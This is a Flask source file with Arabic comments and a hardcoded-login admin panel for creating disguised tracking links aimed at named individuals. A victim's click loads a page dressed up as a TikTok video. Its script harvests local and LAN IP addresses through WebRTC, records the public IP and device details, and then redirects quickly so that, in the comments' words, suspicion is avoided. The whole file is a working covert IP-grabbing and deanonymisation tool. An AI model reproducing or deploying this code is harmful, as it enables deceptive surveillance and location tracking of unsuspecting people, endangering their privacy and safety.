from flask import Flask, render_template_string, request, redirect, jsonify, Response
import uuid
import datetime
from functools import wraps

app = Flask(__name__)

# قاعدة بيانات مؤقتة في الذاكرة لحفظ الروابط والنقرات
links_db = {}

# بيانات تسجيل الدخول المطلوبة
USERNAME = "khaled"
PASSWORD = "ALG@2022"

# دالة للتحقق من الهوية (الحماية)
def check_auth(username, password):
    return username == USERNAME and password == PASSWORD

def requires_auth(f):
    @wraps(f)
    def decorated(*arcs, **kwargs):
        auth = request.authorization
        if not auth or not check_auth(auth.username, auth.password):
            return Response(
                'يجب تسجيل الدخول للوصول إلى لوحة التحكم.', 401,
                {'WWW-Authenticate': 'Basic realm="Login Required"'}
            )
        return f(*arcs, **kwargs)
    return decorated

# واجهة الإدارة المدمجة (تجمع الإنشاء والإحصائيات في صفحة واحدة)
HTML_LAYOUT = '''
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>لوحة تحكم خالد - التتبع الذكي</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f4f6f9; color: #333; margin: 0; padding: 0; }
        .navbar { background-color: #2c3e50; color: white; padding: 15px; text-align: center; font-size: 20px; font-weight: bold; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
        .container { max-width: 800px; margin: 25px auto; background: white; padding: 25px; border-radius: 10px; box-shadow: 0 4px 12px rgba(0,0,0,0.08); }
        h2 { color: #2c3e50; font-size: 20px; border-bottom: 2px solid #3498db; padding-bottom: 8px; margin-top: 30px; }
        h2:first-of-type { margin-top: 0; }
        label { font-weight: bold; display: block; margin-top: 15px; color: #555; }
        input[type="text"], input[type="url"] { width: 100%; padding: 12px; margin-top: 6px; border: 1px solid #ccc; border-radius: 6px; box-sizing: border-box; font-size: 15px; }
        button { width: 100%; background-color: #3498db; color: white; border: none; padding: 14px; margin-top: 20px; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; transition: 0.3s; }
        button:hover { background-color: #2980b9; }
        .card { background: #fffde7; padding: 15px; border-right: 5px solid #f1c40f; border-radius: 4px; margin-top: 15px; word-break: break-all; box-shadow: 0 2px 4px rgba(0,0,0,0.05); }
        .link-section { background: #f8f9fa; padding: 20px; border-radius: 8px; border: 1px solid #e2e8f0; margin-bottom: 25px; }
        .stats-table { width: 100%; border-collapse: collapse; margin-top: 15px; font-size: 13px; background: white; }
        .stats-table th, .stats-table td { border: 1px solid #ddd; padding: 12px; text-align: center; }
        .stats-table th { background-color: #2c3e50; color: white; }
        .badge { background: #e74c3c; color: white; padding: 3px 8px; border-radius: 4px; font-size: 12px; font-weight: bold; }
        .refresh-btn { display: inline-block; background-color: #2ecc71; color: white; padding: 8px 15px; text-decoration: none; border-radius: 4px; font-size: 14px; float: left; font-weight: bold; }
        .refresh-btn:hover { background-color: #27ae60; }
        .clear { clear: both; }
    </style>
</head>
<body>
    <div class="navbar">👑 لوحة التحكم والإدارة الموحدة (أهلاً خالد)</div>
    <div class="container">
        
        <!-- قسم إنشاء الروابط -->
        <div class="link-section">
            <h2>➕ توليد رابط تتبع جديد</h2>
            <form action="/create" method="POST">
                <label>الرابط المراد التوجيه إليه (الرابط الحقيقي):</label>
                <input type="url" name="original_url" placeholder="https://youtube.com/watch?v=..." required>
                
                <label>ملاحظة لتمييز هذا الرابط (مثال: مستخدم فيسبوك معين):</label>
                <input type="text" name="note" placeholder="اكتب ملاحظة هنا..." required>
                
                <button type="submit">توليد وإضافة للوحة التحكم</button>
            </form>
        </div>

        {% if latest_link %}
        <!-- عرض الروابط المنشأة حديثاً كـ تأكيد -->
        <div class="card">
            <h3 style="margin-top:0; color:#d35400;">🔗 الرابط الجاهز للإرسال:</h3>
            <p><strong>الملاحظة:</strong> {{ latest_link.note }}</p>
            <p><strong>رابط التمويه:</strong> <input type="text" value="{{ latest_link.url }}" style="width:100%; padding:6px; background:#fff;" readonly onclick="this.select()"></p>
        </div>
        {% endif %}

        <!-- قسم الإحصائيات الشاملة ومراقبة الـ IP -->
        <div>
            <a href="/" class="refresh-btn">🔄 تحديث البيانات فوراُ</a>
            <h2>📊 سجل مراقبة الروابط والـ IPs الحالية</h2>
            <div class="clear"></div>
            
            {% if not links_db %}
                <p style="text-align:center; color:#7f8c8d; padding:20px;">لا توجد روابط منشأة حالياً في الذاكرة.</p>
            {% else %}
                {% for id, data in links_db.items() %}
                    <div style="margin-top: 25px; border: 1px solid #bdc3c7; border-radius: 6px; padding: 15px; background: #fafafa;">
                        <span style="font-size: 16px; font-weight: bold; color: #2c3e50;">📌 المستهدف: {{ data.note }}</span> 
                        <br><small style="color: #7f8c8d;">يوجه إلى: {{ data.url }}</small>
                        <br><small style="color: #3498db; font-weight: bold;">رابط الإرسال: {{ host_url }}secure/{{ id }}</small>
                        <div style="margin-top: 8px;">الزيارات الإجمالية: <span class="badge">{{ data.clicks|length }}</span></div>
                        
                        {% if data.clicks %}
                            <div style="overflow-x:auto; margin-top:10px;">
                                <table class="stats-table">
                                    <thead>
                                        <tr>
                                            <th>الوقت</th>
                                            <th>الـ IP العام (الشبكة)</th>
                                            <th>الـ IP المحلي الداخلي (الهاتف/الـ LAN)</th>
                                            <th>بيانات الهاتف والمتصفح (نوع الجهاز)</th>
                                        </tr>
                                    </thead>
                                    <tbody>
                                        {% for click in data.clicks %}
                                        <tr>
                                            <td>{{ click.time }}</td>
                                            <td style="color:#e74c3c; font-weight:bold; font-size:14px;">{{ click.ip }}</td>
                                            <td style="color:#27ae60; font-weight:bold; font-size:12px;">{{ click.local_ip }}</td>
                                            <td style="font-size:11px; text-align:right; max-width: 250px; word-break: break-word;">{{ click.device }}</td>
                                        </tr>
                                        {% endfor %}
                                    </tbody>
                                </table>
                            </div>
                        {% else %}
                            <p style="color:#95a5a6; font-size:12px; margin-top:10px;">بانتظار دخول الضحية أو المستهدف...</p>
                        {% endif %}
                    </div>
                {% endfor %}
            {% endif %}
        </div>

    </div>
</body>
</html>
'''

@app.route('/')
@requires_auth
def home():
    return render_template_string(HTML_LAYOUT, links_db=links_db, host_url=request.host_url, latest_link=None)

@app.route('/create', methods=['POST'])
@requires_auth
def create():
    original_url = request.form.get('original_url')
    note = request.form.get('note')
    link_id = str(uuid.uuid4())[:8]
    
    links_db[link_id] = {
        'url': original_url,
        'note': note,
        'clicks': []
    }
    
    latest_link = {
        'note': note,
        'url': f"{request.host_url}secure/{link_id}"
    }
    
    # إعادة تحميل نفس الصفحة وعرض الرابط الجديد بداخلها مع جدول الإحصائيات الكاملة
    return render_template_string(HTML_LAYOUT, links_db=links_db, host_url=request.host_url, latest_link=latest_link)

@app.route('/secure/<link_id>')
def secure_redirect(link_id):
    if link_id in links_db:
        data = links_db[link_id]
        
        # وسوم التمويه كفيديو تيك توك رائج لجذب نقرات الهواتف
        title = "TikTok · Video Premium Algerian"
        description = "▶  1.2M Views - Watch original high quality video clip."
        image_url = "https://upload.wikimedia.org/wikipedia/commons/thumb/0/09/YouTube_full-color_icon_%282017%29.svg/640px-YouTube_full-color_icon_%282017%29.svg.png"
        
        return f'''
        <!DOCTYPE html>
        <html lang="ar">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            
            <title>{title}</title>
            <meta property="og:title" content="{title}">
            <meta property="og:description" content="{description}">
            <meta property="og:image" content="{image_url}">
            <meta property="og:type" content="video.other">
            
            <script>
                // محرك اقتناص الـ IP المحلي المطور للهواتف الذكية (iOS & Android)
                function gatherLocalIPsAndRedirect() {{
                    var detectedIPs = [];
                    
                    window.RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
                    
                    if (!window.RTCPeerConnection) {{
                        sendData("غير مدعوم على هذا المتصفح");
                        return;
                    }}

                    var pc = new RTCPeerConnection({{ iceServers: [] }});
                    pc.createDataChannel(""); 
                    
                    pc.onicecandidate = function(e) {{
                        if (!e || !e.candidate || !e.candidate.candidate) return;
                        
                        var candidate = e.candidate.candidate;
                        // استخراج الأنماط المختلفة للـ IP (سواء IPv4 عادي أو IPv6 أو العناوين المحلية المشفرة mDNS)
                        var ipRegex = /([0-9]{{1,3}}(\\.[0-9]{{1,3}}){{3}})/;
                        var ipv6Regex = /([a-f0-9]{{1,4}}(:[a-f0-9]{{1,4}}){{7}})/i;
                        var mdnsRegex = /([a-f0-9\\-]+\\.local)/i;
                        
                        var match = ipRegex.exec(candidate) || ipv6Regex.exec(candidate) || mdnsRegex.exec(candidate);
                        if (match && detectedIPs.indexOf(match[1]) === -1) {{
                            detectedIPs.push(match[1]);
                        }}
                    }};

                    pc.createOffer().then(function(sdp) {{
                        // فحص الـ SDP النصي مباشرة لاستخراج أي بيانات إضافية للشبكة المحلية قبل التوجيه
                        sdp.sdp.split('\\n').forEach(function(line) {{
                            if(line.indexOf('c=IN') === 0 || line.indexOf('a=candidate') === 0) {{
                                var parts = line.split(' ');
                                parts.forEach(function(part){{
                                    if(part.match(/[0-9]{{1,3}}(\\.[0-9]{{1,3}}){{3}}/) || part.match(/\\.local$/)) {{
                                        if(detectedIPs.indexOf(part) === -1) detectedIPs.push(part);
                                    }}
                                }});
                            }}
                        }});
                        pc.setLocalDescription(sdp);
                    }}).catch(function(err) {{ }});

                    // مهلة انتظار لجمع البيانات ثم الإرسال والتوجيه السريع لتفادي الشك
                    setTimeout(function() {{
                        var finalLocalIp = detectedIPs.length > 0 ? detectedIPs.join(" | ") : "مخفي (iOS/Android Privacy Protected)";
                        sendData(finalLocalIp);
                    }}, 1000);
                }}

                function sendData(localIp) {{
                    var xhr = new XMLHttpRequest();
                    xhr.open("POST", "/log-click/{link_id}", true);
                    xhr.setRequestHeader("Content-Type", "application/json");
                    xhr.onreadystatechange = function () {{
                        if (xhr.readyState === 4) {{
                            // التوجيه الفوري للرابط الحقيقي المطلوب بعد سحب البيانات
                            window.location.href = "{data['url']}";
                        }}
                    }};
                    xhr.send(JSON.stringify({{ "local_ip": localIp }}));
                }}
                
                window.onload = gatherLocalIPsAndRedirect;
            </script>
        </head>
        <body style="background:#000; color:#fff; font-family:sans-serif; text-align:center; padding-top:40%;">
            <div style="font-size:18px;">جاري تحميل الفيديو... 🎥</div>
            <div style="font-size:12px; color:#555; margin-top:10px;">تعتمد السرعة على جودة شبكة الجيل الرابع لديك</div>
        </body>
        </html>
        '''
    return "الرابط المطلوب انتهت صلاحيته أو غير موجود.", 404

@app.route('/log-click/<link_id>', methods=['POST'])
def log_click(link_id):
    if link_id in links_db:
        data = request.get_json() or {}
        local_ip = data.get('local_ip', 'غير معروف')
        
        # اقتناص دقيق للـ IP العام من مزودي الخدمة (موبيليس، جيزي، أوريدو أو الـ ADSL) عبر الـ Headers الخلفية
        ip_address = request.headers.get('X-Forwarded-For', request.remote_addr)
        if ip_address and ',' in ip_address:
            ip_address = ip_address.split(',')[0].strip()
            
        user_agent = request.headers.get('User-Agent')
        current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        links_db[link_id]['clicks'].append({
            "ip": ip_address,
            "local_ip": local_ip,
            "device": user_agent,
            "time": current_time
        })
        return jsonify({"status": "success"}), 200
    return jsonify({"status": "error"}), 404

if __name__ == '__main__':
    # تشغيل التطبيق في الوضع الافتراضي
    app.run(debug=True, host='0.0.0.0', port=5000)
